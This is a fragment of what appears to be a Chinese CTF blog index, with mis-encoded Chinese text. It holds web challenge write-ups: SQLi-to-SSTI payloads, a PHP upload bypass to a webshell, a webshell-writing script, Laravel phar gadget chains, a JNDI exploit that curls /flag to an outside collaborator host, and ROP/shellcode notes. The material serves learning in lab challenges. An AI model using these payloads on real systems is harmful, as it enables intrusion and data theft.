\u0026#39;union\u0026#39;, \u0026#39;inno\u0026#39;, \u0026#39;like\u0026#39;, \u0026#39;regexp\u0026#39;] bans = [\u0026#39;\u0026#34;\u0026#39;, \u0026#39;#\u0026#39;, \u0026#39;%\u0026#39;, \u0026#39;\u0026amp;\u0026#39;, \u0026#39;;\u0026#39;, \u0026#39;\u0026lt;\u0026#39;, \u0026#39;=\u0026#39;, \u0026#39;\u0026gt;\u0026#39;, \u0026#39;\\\\\u0026#39;, \u0026#39;^\u0026#39;, \u0026#39;`\u0026#39;, \u0026#39;|\u0026#39;, \u0026#39;*\u0026#39;, \u0026#39;--\u0026#39;, \u0026#39;+\u0026#39;] for ban in word_bans: if re.search(ban, username, re.IGNORECASE): self.finish(\u0026#39;\u0026lt;script\u0026gt;alert(`error`);history.go(-1);\u0026lt;/script\u0026gt;\u0026#39;) return for ban in bans: if ban in username: self.finish(\u0026#39;\u0026lt;script\u0026gt;alert(`error`);history.go(-1);\u0026lt;/script\u0026gt;\u0026#39;) return if not username or not password: self.render(\u0026#39;register.html\u0026#39;) return if username == \u0026#39;admin\u0026#39;: self.render(\u0026#39;register.html\u0026#39;) return conn = pymysql.connect(\u0026#39;localhost\u0026#39;, db_username, db_password, \u0026#39;qwb\u0026#39;) cursor = conn.cursor() try: cursor.execute(\u0026#34;SELECT qwbqwbqwbuser,qwbqwbqwbpass from qwbtttaaab111e where qwbqwbqwbuser=\u0026#39;%s\u0026#39;\u0026#34; % username) results = cursor.fetchall() if len(results) != 0: self.finish(\u0026#39;\u0026lt;script\u0026gt;alert(`this username had been used`);history.go(-1);\u0026lt;/script\u0026gt;\u0026#39;) conn.commit() conn.close() return except: conn.commit() conn.close() self.finish(\u0026#39;\u0026lt;script\u0026gt;alert(`error`);history.go(-1);\u0026lt;/script\u0026gt;\u0026#39;) return try: cursor.execute(\u0026#39;insert into qwbtttaaab111e (qwbqwbqwbuser, qwbqwbqwbpass) values(%s, %s)\u0026#39;, [username, password]) conn.commit() conn.close() self.finish(\u0026#34;\u0026lt;script\u0026gt;alert(`success`);location.href=\u0026#39;/index.php\u0026#39;;\u0026lt;/script\u0026gt;\u0026#34;) return except: conn.rollback() conn.close() self.finish(\u0026#39;\u0026lt;script\u0026gt;alert(`error`);history.go(-1);\u0026lt;/script\u0026gt;\u0026#39;) return class LogoutHandler(tornado.web.RequestHandler): def get(self): self.clear_all_cookies() self.redirect(\u0026#39;/\u0026#39;, permanent=True) class AdminHandler(tornado.web.RequestHandler): def get(self): user = self.get_secure_cookie(\u0026#39;user\u0026#39;) if not user or user != b\u0026#39;admin\u0026#39;: self.redirect(\u0026#39;/index.php\u0026#39;, permanent=True) return self.render(\u0026#39;admin.html\u0026#39;) class ImageHandler(tornado.web.RequestHandler): def get(self): user = self.get_secure_cookie(\u0026#39;user\u0026#39;) image_name = self.get_argument(\u0026#39;qwb_image_name\u0026#39;, \u0026#39;header.jpeg\u0026#39;) if not image_name: self.redirect(\u0026#39;/\u0026#39;, permanent=True) return else: if not user or user != b\u0026#39;admin\u0026#39;: self.redirect(\u0026#39;/\u0026#39;, permanent=True) return if image_name.endswith(\u0026#39;.py\u0026#39;) or \u0026#39;flag\u0026#39; in image_name or \u0026#39;..\u0026#39; in image_name: self.finish(\u0026#34;nonono, you can\u0026#39;t read it.\u0026#34;) return image_name = os.path.join(os.getcwd() + \u0026#39;/image\u0026#39;, image_name) with open(image_name, \u0026#39;rb\u0026#39;) as (f): img = f.read() self.set_header(\u0026#39;Content-Type\u0026#39;, \u0026#39;image/jpeg\u0026#39;) self.finish(img) return class SecretHandler(tornado.web.RequestHandler): def get(self): if len(tornado.web.RequestHandler._template_loaders): for i in tornado.web.RequestHandler._template_loaders: tornado.web.RequestHandler._template_loaders[i].reset() msg = self.get_argument(\u0026#39;congratulations\u0026#39;, \u0026#39;oh! you find it\u0026#39;) bans = [] for ban in bans: if ban in msg: self.finish(\u0026#39;bad hack,go out!\u0026#39;) return with open(\u0026#39;congratulations.html\u0026#39;, \u0026#39;w\u0026#39;) as (f): f.write(\u0026#39;\u0026lt;html\u0026gt;\u0026lt;head\u0026gt;\u0026lt;title\u0026gt;congratulations\u0026lt;/title\u0026gt;\u0026lt;/head\u0026gt;\u0026lt;body\u0026gt;\u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt;alert(\u0026#34;%s\u0026#34;);location.href=\\\u0026#39;/admin.php\\\u0026#39;;\u0026lt;/script\u0026gt;\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt;\\n\u0026#39; % msg) f.flush() self.render(\u0026#39;congratulations.html\u0026#39;) if tornado.web.RequestHandler._template_loaders: for i in tornado.web.RequestHandler._template_loaders: tornado.web.RequestHandler._template_loaders[i].reset() def make_app(): return tornado.web.Application([ ( \u0026#39;/index.php\u0026#39;, MainHandler), ( \u0026#39;/login.php\u0026#39;, LoginHandler), ( \u0026#39;/logout.php\u0026#39;, LogoutHandler), ( \u0026#39;/register.php\u0026#39;, RegisterHandler), ( \u0026#39;/admin.php\u0026#39;, AdminHandler), ( \u0026#39;/qwbimage.php\u0026#39;, ImageHandler), ( \u0026#39;/good_job_my_ctfer.php\u0026#39;, SecretHandler), ( \u0026#39;/\u0026#39;, MainHandler)], **settings) if __name__ == \u0026#39;__main__\u0026#39;: app = make_app() app.listen(8000) tornado.ioloop.IOLoop.current().start() print(\u0026#39;start\u0026#39;) å¯ä»¥çœ‹åˆ°/good_job_my_ctfer.phpæœ‰sstiï¼Œä½†æ˜¯{{}}è¢«è¿‡æ»¤ï¼Œåªèƒ½ç”¨{%%}ï¼Œè¿™é‡Œç”¨åˆ°çš„æ˜¯{%extends %}ï¼Œå®ƒå¯ä»¥ä¼ é€’ä¸€ä¸ªæ–‡ä»¶è·¯å¾„ä½œä¸ºå‚æ•°ï¼Œå°†å…¶åŒ…å«å¹¶æ¸²æŸ“\næ‰€ä»¥æˆ‘ä»¬å¯ä»¥å…ˆé€šè¿‡sqliçš„outfileå†™æ–‡ä»¶ï¼Œç„¶åé€šè¿‡sstiåŒ…å« æ¥æ‰§è¡Œè¯»flagçš„å‘½ä»¤\n/register.php?username=amiz\u0026amp;password={%set return __import__(\u0026#34;os\u0026#34;).popen(\u0026#34;cat /flag\u0026#34;).read()%} /register.php?username=amiz\u0026#39; into outfile \u0026#39;/var/lib/mysql-files/amiz\u0026amp;password=amiz /good_job_my_ctfer.php?congratulations={%extends /var/lib/mysql-files/amiz%} å…ˆé€šè¿‡æ³¨å†ŒæŠŠpayloadå†™åˆ°å¯†ç éƒ¨åˆ†ï¼Œç„¶åoutfileåˆ°mysqlçš„é»˜è®¤å¯¼å‡ºç›®å½•/var/lib/mysql-files/ï¼Œæœ€ååŒ…å«\nflag{79d863ac-1fc6-42f6-951a-d3b6f0468b7f}\n[PWNHUB å…¬å¼€èµ› 2018]å‚» fufu çš„å·¥ä½œæ—¥ | upload /UploadFile.class.php.bak, /index.php.bak æœ‰å¤‡ä»½æ–‡ä»¶æ³„éœ²ï¼Œä½¿ç”¨phpjiamiè¿›è¡ŒåŠ å¯†ï¼Œæˆ‘ä»¬ç”¨è„šæœ¬è¿›è¡Œè§£å¯†\n\u0026lt;?php if($_FILES) { include \u0026#39;UploadFile.class.php\u0026#39;; $dist = \u0026#39;upload\u0026#39;; $upload = new UploadFile($dist, \u0026#39;upfile\u0026#39;); $data = $upload-\u0026gt;upload(); } \u0026lt;?php class UploadFile { public $error = \u0026#39;\u0026#39;; protected $field; protected $allow_ext; protected $allow_size; protected $dist_path; protected $new_path; function __construct($dist_path, $field=\u0026#39;upfile\u0026#39;, $new_name=\u0026#39;random\u0026#39;, $allow_ext=[\u0026#39;gif\u0026#39;, \u0026#39;jpg\u0026#39;, \u0026#39;jpeg\u0026#39;, \u0026#39;png\u0026#39;], $allow_size=102400) { $this-\u0026gt;field = $field; $this-\u0026gt;allow_ext = $allow_ext; $this-\u0026gt;allow_size = $allow_size; $this-\u0026gt;dist_path = realpath($dist_path); if ($new_name === \u0026#39;random\u0026#39;) { $this-\u0026gt;new_name = uniqid(); } elseif (is_string($new_name)) { $this-\u0026gt;new_name = $new_name; } else { $this-\u0026gt;new_name = null; } } protected function codeToMessage($code) { switch ($code) { case UPLOAD_ERR_INI_SIZE: $message = \u0026#34;The uploaded file exceeds the upload_max_filesize directive in php.ini\u0026#34;; break; case UPLOAD_ERR_FORM_SIZE: $message = \u0026#34;The uploaded file exceeds the MAX_FILE_SIZE directive that was specified in the HTML form\u0026#34;; break; case UPLOAD_ERR_PARTIAL: $message = \u0026#34;The uploaded file was only partially uploaded\u0026#34;; break; case UPLOAD_ERR_NO_FILE: $message = \u0026#34;No file was uploaded\u0026#34;; break; case UPLOAD_ERR_NO_TMP_DIR: $message = \u0026#34;Missing a temporary folder\u0026#34;; break; case UPLOAD_ERR_CANT_WRITE: $message = \u0026#34;Failed to write file to disk\u0026#34;; break; case UPLOAD_ERR_EXTENSION: $message = \u0026#34;File upload stopped by extension\u0026#34;; break; default: $message = \u0026#34;Unknown upload error\u0026#34;; break; } return $message; } protected function error($info) { $this-\u0026gt;error = $info; return false; } public function upload() { if(empty($_FILES[$this-\u0026gt;field])) { return $this-\u0026gt;error(\u0026#39;ä¸Šä¼ æ–‡ä»¶ä¸ºç©º\u0026#39;); } if(is_array($_FILES[$this-\u0026gt;field][\u0026#39;error\u0026#39;])) { return $this-\u0026gt;error(\u0026#39;ä¸€æ¬¡åªèƒ½ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶\u0026#39;); } if($_FILES[$this-\u0026gt;field][\u0026#39;error\u0026#39;] != UPLOAD_ERR_OK) { return $this-\u0026gt;error($this-\u0026gt;codeToMessage($_FILES[$this-\u0026gt;field][\u0026#39;error\u0026#39;])); } $filename = !empty($_POST[$this-\u0026gt;field]) ? $_POST[$this-\u0026gt;field] : $_FILES[$this-\u0026gt;field][\u0026#39;name\u0026#39;]; if(!is_array($filename)) { $filename = explode(\u0026#39;.\u0026#39;, $filename); } foreach ($filename as $name) { if(preg_match(\u0026#39;#[\u0026lt;\u0026gt;:\u0026#34;/\\\\|?*.]#is\u0026#39;, $name)) { return $this-\u0026gt;error(\u0026#39;æ–‡ä»¶åä¸­åŒ…å«éæ³•å­—ç¬¦\u0026#39;); } } if($_FILES[$this-\u0026gt;field][\u0026#39;size\u0026#39;] \u0026gt; $this-\u0026gt;allow_size) { return $this-\u0026gt;error(\u0026#39;ä½ ä¸Šä¼ çš„æ–‡ä»¶å¤ªå¤§\u0026#39;); } if(!in_array($filename[count($filename)-1], $this-\u0026gt;allow_ext)) { return $this-\u0026gt;error(\u0026#39;åªå…è®¸ä¸Šä¼ å›¾ç‰‡æ–‡ä»¶\u0026#39;); } // ç”¨.åˆ†å‰²æ–‡ä»¶åï¼Œåªä¿ç•™é¦–å°¾ä¸¤ä¸ªå­—ç¬¦ä¸²ï¼Œé˜²å¾¡Apacheè§£ææ¼æ´ $origin_name = current($filename); $ext = end($filename); $new_name = ($this-\u0026gt;new_name ? $this-\u0026gt;new_name : $origin_name) . \u0026#39;.\u0026#39; . $ext; $target_fullpath = $this-\u0026gt;dist_path . DIRECTORY_SEPARATOR . $new_name; // åˆ›å»ºç›®å½• if(!is_dir($this-\u0026gt;dist_path)) { mkdir($this-\u0026gt;dist_path); } if(is_uploaded_file($_FILES[$this-\u0026gt;field][\u0026#39;tmp_name\u0026#39;]) \u0026amp;\u0026amp; move_uploaded_file($_FILES[$this-\u0026gt;field][\u0026#39;tmp_name\u0026#39;], $target_fullpath)) { // Success upload } elseif (rename($_FILES[$this-\u0026gt;field][\u0026#39;tmp_name\u0026#39;], $target_fullpath)) { // Success upload } else { return $this-\u0026gt;error(\u0026#39;å†™å…¥æ–‡ä»¶å¤±è´¥ï¼Œå¯èƒ½æ˜¯ç›®æ ‡ç›®å½•ä¸å¯å†™\u0026#39;); } return [ \u0026#39;name\u0026#39; =\u0026gt; $origin_name, \u0026#39;filename\u0026#39; =\u0026gt; $new_name, \u0026#39;type\u0026#39; =\u0026gt; $ext ]; } } æ³¨æ„åˆ°è¿™ä¸ªåç¼€\n$filename = !empty($_POST[$this-\u0026gt;field]) ? $_POST[$this-\u0026gt;field] : $_FILES[$this-\u0026gt;field][\u0026#39;name\u0026#39;]; if(!in_array($filename[count($filename)-1], $this-\u0026gt;allow_ext)) { return $this-\u0026gt;error(\u0026#39;åªå…è®¸ä¸Šä¼ å›¾ç‰‡æ–‡ä»¶\u0026#39;); } $ext = end($filename); $target_fullpath = $this-\u0026gt;dist_path . DIRECTORY_SEPARATOR . $new_name; åœ¨åˆ¤æ–­çš„æ—¶å€™ç”¨çš„æ˜¯count($filename)-1ï¼Œå˜ç›¸æç¤ºæˆ‘ä»¬å¯ä»¥æœ‰å¾ˆå¤šçš„nameï¼Œé…åˆæ•°ç»„è¿›è¡Œç»•è¿‡\n/upload/61ebe7df95da2.php?amiz=system(\u0026#39;cat /flag_9bc85242c9f1a7663e6806778e8a8558\u0026#39;); flag_9bc85242c9f1a7663e6806778e8a8558\n*ctf473831530_2018_web_virink_web | php-shell \u0026lt;?php $sandbox = \u0026#39;/www/sandbox/\u0026#39; . md5(\u0026#39;orange\u0026#39; . $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]); mkdir($sandbox); chdir($sandbox); if (isset($_GET[\u0026#39;cmd\u0026#39;]) \u0026amp;\u0026amp; strlen($_GET[\u0026#39;cmd\u0026#39;]) \u0026lt;= 20) { exec($_GET[\u0026#39;cmd\u0026#39;]); } else if (isset($_GET[\u0026#39;reset\u0026#39;])) { exec(\u0026#39;/bin/rm -rf \u0026#39; . $sandbox); } echo \u0026#34;\u0026lt;br /\u0026gt; IP : {\\$_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]}\u0026#34;; ?\u0026gt; è·Ÿorangeä½¬çš„[HitconCTF 2017]babyfirst-revengeä¸€æ ·ï¼Œå¯¹cmdå­—ç¬¦æ•°æ›´å®½æ¾äº†ï¼Œè¿™é‡Œé‡‡ç”¨å¸ˆå‚…çš„è„šæœ¬\nimport requests base_url = \u0026#39;http://a40430ad-39b5-4020-a550-14afee81e640.node1.buuoj.cn\u0026#39; def exec_cmd2(c): # exec cmd my_params = { \u0026#39;cmd\u0026#39;: c } r = requests.get(base_url, params=my_params) print(\u0026#39;exec cmd2\u0026#39;, c, r) def write_webshell(): filename = [r\u0026#39;\u0026gt;echo\\ \\\\\u0026#39;, r\u0026#34;\u0026gt;\\\u0026#39;\\\u0026lt;\\?php \\\\\u0026#34;, r\u0026#39;\u0026gt;eval\\(\u0026#39;, r\u0026#39;\u0026gt;\\$_GET\\[c\\]\\)\u0026#39;, r\u0026#34;\u0026gt;\\;\\\u0026#39;\\\u0026gt;2.php\u0026#34;] for i in filename: my_params = { \u0026#39;cmd\u0026#39;: i } r = requests.get(base_url, params=my_params) print(i, r.status_code) cmd_list = [\u0026#39;ls -tr\u0026gt;1.sh\u0026#39;, \u0026#39;sh 1.sh\u0026#39;] for i in cmd_list: exec_cmd2(i) if __name__ == \u0026#39;__main__\u0026#39;: write_webshell() print(\u0026#39;ok\u0026#39;) ä¹‹åç”¨/sandbox/xxxx/2.php?c=eval($_POST[\u0026lsquo;cmd\u0026rsquo;]);è¿æ¥èšå‰‘ï¼Œä¸è¿‡ç”±äºç¯å¢ƒé—®é¢˜ï¼Œåé¢å†…ç½‘çš„éƒ¨åˆ†åšä¸äº†äº†ï¼Œå¯„\nå‚è€ƒï¼šwp\npage 08 [HFCTF 2021 Final]tinypng | laravelååºåˆ—åŒ– phar æ˜¯laravelæ¡†æ¶ï¼Œç»™äº†å¾ˆè¯¦ç»†çš„æºç ï¼Œä½†æ˜¯ä¸»è¦çš„ä¹Ÿå°±æ˜¯è¿™äº›\nç»™å‡ºçš„laravelæ¡†æ¶çš„æºç ï¼Œç‰ˆæœ¬æ˜¯8.53.0ï¼Œé¦–å…ˆä»/routes/web.phpå…¥æ‰‹çœ‹ä¸€ä¸‹è·¯ç”±\nä¸€å…±ä¸¤ä¸ªè·¯ç”±ï¼Œ/å³/indexï¼Œå®ç°çš„æ˜¯æ–‡ä»¶ä¸Šä¼ çš„ä¸€äº›å¤„ç† æ¯”å¦‚åç¼€çš„è¿‡æ»¤å’Œæ–‡ä»¶åçš„è®¾ç½®ä¹‹ç±»çš„ï¼Œ/imageåˆ™æ˜¯ç‰¹æ®Šçš„ï¼Œè·Ÿè¿‡å»çœ‹ImageControllerç±»\näº®ç‚¹åœ¨ç¬¬25è¡Œï¼Œæ–°å»ºäº†ä¸€ä¸ªimgcompresså®ä¾‹å¹¶æ‰§è¡ŒcompressImg()ï¼Œè·Ÿè¿‡å»çœ‹\né¦–å…ˆè°ƒç”¨çš„_openImage()é‡Œç¬¬44è¡Œçš„getimagesize()ç»“åˆpharä¼šè§¦å‘ååºåˆ—åŒ–ï¼Œæ­¤å¤„çš„å‚æ•°$this-\u0026gt;srcæ¥è‡ªäº$sourceï¼Œä¹Ÿå°±æ˜¯$request -\u0026gt; input('image');ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¼ å…¥çš„imageå‚æ•°ï¼Œå¯æ§\nååºåˆ—åŒ–çš„å…¥å£æ‰¾åˆ°äº†ï¼Œæ¥ä¸‹æ¥å°±æ˜¯æ‰¾ä¸€æ‰¾è°ƒç”¨é“¾ï¼Œè¿™é‡Œå°±ç›´æ¥æ”¾å‡ºæ¥ï¼ˆæˆ‘å¤ªèœäº† å¯„\nå¯ç”¨é“¾å­1\n\u0026lt;?php namespace Symfony\\Component\\Routing\\Loader\\Configurator{ class ImportConfigurator{ private $parent; private $route; public function __construct($class){ $this-\u0026gt;parent=$class; $this-\u0026gt;route=\u0026#39;test\u0026#39;; } } } namespace Mockery{ class HigherOrderMessage{ private $mock; private $method; public function __construct($class){ $this-\u0026gt;mock=$class; $this-\u0026gt;method=\u0026#39;generate\u0026#39;; } } } namespace PHPUnit\\Framework\\MockObject{ final class MockTrait{ private $mockName; private $classCode; public function __construct(){ $this-\u0026gt;mockName=\u0026#39;123\u0026#39;; $this-\u0026gt;classCode=\u0026#39;phpinfo();\u0026#39;; } } } namespace{ use \\Symfony\\Component\\Routing\\Loader\\Configurator\\ImportConfigurator; use \\Mockery\\HigherOrderMessage; use \\PHPUnit\\Framework\\MockObject\\MockTrait; $c=new MockTrait(); $b=new HigherOrderMessage($c); $a=new ImportConfigurator($b); @unlink(\u0026#34;phar.phar\u0026#34;); $phar=new Phar(\u0026#34;phar.phar\u0026#34;); $phar-\u0026gt;startBuffering(); $phar-\u0026gt;setStub(\u0026#39;GIF89a\u0026#39;.\u0026#34;__HALT_COMPILER();\u0026#34;); $phar-\u0026gt;setMetadata($a); $phar-\u0026gt;addFromString(\u0026#34;test.txt\u0026#34;, \u0026#34;test\u0026#34;); $phar-\u0026gt;stopBuffering(); } ?\u0026gt; å¯ç”¨é“¾å­2\n\u0026lt;?php namespace Illuminate\\Broadcasting { class PendingBroadcast { protected $events; protected $event; public function __construct($events, $event) { $this-\u0026gt;events = $events; $this-\u0026gt;event = $event; } } class BroadcastEvent { public $connection; public function __construct($connection) { $this-\u0026gt;connection = $connection; } } } namespace Illuminate\\Bus { class Dispatcher { protected $queueResolver; public function __construct($queueResolver){ $this-\u0026gt;queueResolver = $queueResolver; } } } namespace { $c = new Illuminate\\Broadcasting\\BroadcastEvent(\u0026#39;ls\u0026#39;); $b = new Illuminate\\Bus\\Dispatcher(\u0026#39;system\u0026#39;); $a = new Illuminate\\Broadcasting\\PendingBroadcast($b, $c); #print(urlencode(serialize($a))); @unlink(\u0026#34;phar.phar\u0026#34;); $phar=new Phar(\u0026#34;phar.phar\u0026#34;); $phar-\u0026gt;startBuffering(); $phar-\u0026gt;setStub(\u0026#39;GIF89a\u0026#39;.\u0026#34;__HALT_COMPILER();\u0026#34;); $phar-\u0026gt;setMetadata($a); $phar-\u0026gt;addFromString(\u0026#34;test.txt\u0026#34;, \u0026#34;test\u0026#34;); $phar-\u0026gt;stopBuffering(); } å°†ç”Ÿæˆçš„pharæ–‡ä»¶ç”¨gzipå‹ç¼©åä¸Šä¼ ï¼ˆè®°å¾—è¦æ”¹ä¸€ä¸‹content-typeï¼‰ï¼Œåœ¨imageå¤„è®¿é—®/image?image=phar://../storage/app/uploads/xxxxxxxxxx.pngå³å¯çœ‹åˆ°éšè—åœ¨500æŠ¥é”™ä¸‹é¢çš„phpinfo\nå…‰çœ‹åˆ°phpinfoä¸æ˜¯ç›®æ ‡ï¼Œè¿˜éœ€è¦ç»§ç»­æ‰§è¡Œå‘½ä»¤ï¼Œè¿™é‡Œç”¨çš„æ˜¯ç¬¬äºŒä¸ªé“¾å­ ç›¸å½“äºæ‰§è¡Œä»¥ä¸‹çš„å‘½ä»¤\nsystem(\u0026#34;cd ../../../;ls\u0026#34;); system(\u0026#34;cd ../../../;cat flag\u0026#34;); å‚è€ƒï¼šwp1 wp2\nâ€”â€”â€”â€”å“„å ‚å¤§å­äº†å®¶äººä»¬ æˆ‘æ˜¯æ†¨æ‰¹ è¿™ä¸ªgetä¼ imageçš„åœ°æ–¹æˆ‘ä¸€ç›´åœ¨ç”¨postä¼  æˆ‘è¿˜åœ¨çº³é—·ä¸ºå•¥ä¸€ç›´ä¼šæŠ¥405çš„é”™ğŸ˜…ğŸ˜…ğŸ˜…\n[NPUCTF2020]EzShiro å’Œ [çº¢æ˜è°·CTF 2021]JavaWeb æ˜¯å®Œå…¨ä¸€æ ·çš„payload\né¦–å…ˆæ˜¯ä¸€ä¸ª/;/jsonç»•è¿‡é‰´æƒï¼Œä¹‹åæ˜¯jndiæ³¨å…¥ï¼Œç”¨é‚£ä¸ªjarä¸€æŠŠæ¢­\n[\u0026#34;ch.qos.logback.core.db.JNDIConnectionSource\u0026#34;,{\u0026#34;jndiLocation\u0026#34;:\u0026#34;rmi://101.35.114.107:1099/qhx0ip\u0026#34;}] java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C \u0026#34;curl http://mg6uynla2pxa8ilgp4cprm0suj09oy.burpcollaborator.net/ -F file=@/flag\u0026#34; -A \u0026#34;101.35.114.107\u0026#34; ","date":"2022-01-19T03:16:47+08:00","permalink":"https://amiaaaz.github.io/2022/01/19/buuoj-web-wp/","section":"posts","tags":["wp"],"title":"buuojåˆ·é¢˜è®°å½•-web"},{"categories":["LTS","pwn"],"contents":"ROP return oriented programming\nç®€å•çš„æ±‡ç¼–æŒ‡ä»¤ ret -\u0026gt; pop EIP (ESPå¢å¤§)\nleave -\u0026gt; move ESP, EBP; pop EBP\nintel AT\u0026amp;T mov eax, 8 movl $8, %eax mov ebx, 0ffffh movl $0xffff, %ebx int 80h int $80 mov eax, [ecx] movl (%ecx), %eax å‡ ç§é˜²æŠ¤æªæ–½ canary: éšæœºå€¼é˜²æ­¢æ ˆæº¢å‡º (cookie) ASLR: å…¨å±€ç³»ç»Ÿå˜é‡/proc/sys/kernel/randomize_va_spaceï¼Œå†…å­˜åœ°å€éšæœºåŒ–ï¼Œè€Œgdbè°ƒè¯•ä¸­ä¸ºå…³é—­çŠ¶æ€ PIE: å†…å­˜åœ°å€éšæœºåŒ– NX: æ•°æ®ä¸å¯æ‰§è¡Œ ret2text åœ¨ä»£ç æ®µ.textå­˜åœ¨åé—¨å‡½æ•°ï¼Œå°†ret addressä¿®æ”¹ä¸ºåé—¨å‡½æ•°çš„åœ°å€æ§åˆ¶å‡½æ•°çš„æ‰§è¡Œ\npayload = cyclic(n) + p32(sys_addr) # n: ebp-eax+4(or 8), p32 or p64 ret2shellcode å­˜åœ¨rwxä»£ç ç‰‡æ®µï¼Œä¼ å…¥shellcodeå¹¶ä¿®æ”¹ret addressä¸ºshellcodeæ‰€åœ¨çš„ç¼“å†²åŒºåœ°å€\nNXä¸å¼€å¯æ—¶ç›´æ¥å†™å…¥æ ˆç¼“å†²åŒºï¼Œå¼€å¯æ—¶å‘bssç¼“å†²åŒºæˆ–å †ç¼“å†²åŒºå†™å…¥shellcodeå¹¶ä½¿ç”¨mprotectèµ‹äºˆå¯æ‰§è¡Œæƒé™\nshellcode\nfrom pwn import * shellcraft.sh() shellcraft.amd64.sh()\t# before: context.arch = \u0026#39;amd64\u0026#39;! payload = asm(shellcraft.sh()) shellcode = b\u0026#39;\u0026#39; payload = shellcode.ljust(n, b\u0026#39;A\u0026#39;) + p32(sh_addr) ret2syscall å­˜åœ¨/bin/shæˆ–shå­—ç¬¦ä¸²ï¼Œæ„é€ gadgetså¤šæ¬¡è·³è½¬ret addræ¥æ‰§è¡Œexecveç³»ç»Ÿè°ƒç”¨ï¼›gadgetsé€šè¿‡ROPgadgetå¯»æ‰¾\nROPgadget --binary filename_here --only \u0026#39;pop|ret\u0026#39; | grep \u0026#39;ebx\u0026#39; ROPgadget --binary filename_here --string \u0026#39;/bin/sh\u0026#39; ROPgadget --binary rop --only \u0026#39;int\u0026#39; æ•´ä½“çš„payloadæ„é€ ä¸å‡½æ•°è°ƒç”¨æ ˆçš„å·¥ä½œåŸç†å’Œç³»ç»Ÿè°ƒç”¨çš„å®ç°æœ‰å…³ï¼Œx86ä¸‹é€šè¿‡int 0x80æ‰§è¡Œï¼Œamd64ä¸‹ä¸ºsyscallï¼›æ³¨æ„å‚æ•°ä¼ å…¥çš„é¡ºåº (1-\u0026gt;N) ä¸æ ˆä¸­å­˜æ”¾çš„é¡ºåº (N-\u0026gt;1)çš„åŒºåˆ«\npayload = flat(cyclic(n), pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, bin_sh_addr, int80_addr) # 0xb: execveçš„ç³»ç»Ÿè°ƒç”¨å· 11, execve(\u0026#34;/bin/sh\u0026#34;, NULL, NULL) _Refer: System call\nä»¥ä¸‹æ˜¯æœ¬æ–‡ä¸­æ¶‰åŠåˆ°çš„ å’Œæˆ‘å­¦ä¹ æ—¶çœ‹è¿‡çš„æ‰€æœ‰æ–‡ç« çš„é“¾æ¥ğŸ”— æ¯æ—¥æ„Ÿè°¢äº’è”ç½‘çš„ä¸°å¯Œèµ„æºï¼ˆ XMCVE 2020 CTF Pwnå…¥é—¨è¯¾ç¨‹\nctfwiki - Stack Overflow\nè’¸ç±³ROP\n365-days-get-xuanwulab-job/weeks/week1.md\nC è¯­è¨€å‡½æ•°è°ƒç”¨æ ˆ (ä¸€)\nC è¯­è¨€å‡½æ•°è°ƒç”¨æ ˆ (äºŒ)\nC è¯­è¨€å‡½æ•°è°ƒç”¨æ ˆ (äºŒ)\nSystem call\n","date":"2022-01-18T00:00:14+08:00","permalink":"https://amiaaaz.github.io/2022/01/18/pwn-rop-study-notes/","section":"posts","tags":["pwn"],"title":"pwn ropå…¥é—¨-å­¦ä¹ ç¬”è®°"},{"categories":[],"contents":"å†™ç‚¹ä»€ä¹ˆå‘¢ï¼Ÿç°åœ¨æ˜¯2022å¹´1æœˆ2æ—¥23ç‚¹08åˆ†ï¼Œæœ¬æ¥åº”è¯¥åœ¨ç–¯ç‹‚çš„è‚æ•°æ®ç»“æ„çš„æœŸæœ«å¤ä¹ ï¼Œä½†æ˜¯æˆ‘è¿˜æ˜¯å†³å®šæŠŠæœ¬æ¥è®¡åˆ’åœ¨å›å®¶çš„é£æœºä¸Šå†™çš„å¹´æœ«æ€»ç»“å†™æ‰ï¼Œäº†ä¸€æ¡©å¿ƒäº‹ã€‚\n2021ï¼Œå¯¹æˆ‘è€Œè¨€æ˜¯æœ‰æŒ‘æˆ˜çš„ä¸€å¹´ã€‚å››æœˆåˆæ­£å¼å¼€å§‹å­¦å®‰å…¨ï¼Œæ–­æ–­ç»­ç»­çš„è‡ªå·±çç¢ç£¨ï¼Œ7æœˆåº•åŠ å…¥V\u0026amp;Nï¼ˆè§åˆ°äº†å¾ˆå¤šå¾ˆå¤šå·¨nbçš„å¸ˆå‚…ï¼‰ï¼Œæš‘å‡å› ä¸ºä¸€äº›æ‡‚å¾—éƒ½æ‡‚çš„åŸå› æ‘†äº†ï¼Œå¼€å­¦ä¹‹åçš„9æœˆå‚åŠ äº†ä¸€æ¬¡hvvï¼Œ10æœˆå‚åŠ å¼ºç½‘æ¯é’å°‘èµ›æ‹¿äº†ä¸€ç­‰å¥–ï¼ˆæ„Ÿè°¢ä¸¤ä½åŒé˜Ÿå¸ˆå‚…å¸¦æˆ‘ï¼‰\nä½†æ˜¯ä¹‹åå‘¢ï¼Ÿæˆ‘å›é¡¾äº†ä¸€ä¸‹10æœˆå’Œä¹‹åçš„å­¦ä¹ è¿‡ç¨‹ï¼Œå‘è‡ªå†…å¿ƒçš„è¯´æˆ‘å¹¶ä¸æ»¡æ„ã€‚è¯´åšäº†å¤šå°‘é¢˜å—ï¼Ÿä¹Ÿæ²¡æœ‰ï¼Œè¯´å­¦æ‰å®äº†å“ªäº›çŸ¥è¯†ç‚¹å—ï¼Ÿä¹Ÿæ²¡æœ‰ã€‚é‚£æ˜¯ç©ä»€ä¹ˆæ¸¸æˆã€äº«å—ç”Ÿæ´»äº†å—ï¼Ÿä¹Ÿæ²¡æœ‰ã€‚å¥‡æ€ªçš„æ˜¯åšå®¢ä¸€ç›´éƒ½åœ¨å‘ï¼Œwpä¹Ÿä¸€ç›´åœ¨å†™ï¼Œé‚£å†™çš„éƒ½æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿéšä¾¿æä¸€äº›åŸºæœ¬çš„æŠ€æœ¯ç»†èŠ‚è¿˜æ˜¯åšä¸åˆ°æ¡ç†æ¸…æ™°åœ°è¡¨è¾¾å‡ºæ¥ï¼Œæ‰“ctfè¿˜æ˜¯ä¸€å‰¯ç›¸å½“æ‹‰å®çš„æ 